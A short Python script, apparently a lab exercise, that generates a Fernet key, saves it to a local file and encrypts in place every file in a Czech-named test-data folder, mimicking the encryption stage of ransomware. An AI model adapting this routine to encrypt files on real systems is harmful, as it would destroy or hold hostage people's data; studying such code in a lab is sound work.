import os
from cryptography.fernet import Fernet
from pathlib import Path

data_dir = Path(__file__).resolve().parent.parent / "testovaci_data"

files = []

key = Fernet.generate_key()

with open("Key.key", "wb") as Key:
    Key.write(key)

for file in data_dir.iterdir():
    if file.is_file() and not file.is_symlink():
        files.append(file)

for file in files:
    with open(file, "rb") as File:
        contents = File.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as File:
        File.write(contents_encrypted)

print("Všechny soubory byly úspěšně zašifrovány")